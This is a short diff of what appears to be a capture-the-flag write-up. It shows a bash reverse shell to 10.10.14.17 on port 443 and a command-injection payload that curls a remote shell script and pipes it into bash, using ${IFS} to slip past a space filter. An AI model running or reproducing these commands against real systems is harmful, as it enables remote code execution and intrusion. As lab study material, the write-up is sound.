@@ -244,3 +244,7 @@ bash -i >& /dev/tcp/10.10.14.17/443 0>&1
 Now that we have the file, we run a curl again but poiting to the shell.sh and interpreting it with bash:
 
 - Payload -> `curl${IFS}10.10.14.17|bash`
+
+<br />
+
+
